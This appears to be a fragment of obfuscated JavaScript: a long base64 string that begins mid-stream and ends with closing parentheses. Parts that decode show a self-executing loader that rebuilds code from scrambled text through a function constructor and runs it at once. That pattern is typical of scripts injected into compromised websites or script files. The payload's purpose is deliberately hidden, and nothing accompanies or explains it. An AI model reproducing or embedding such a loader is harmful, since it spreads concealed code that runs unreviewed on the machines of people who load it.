Igbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
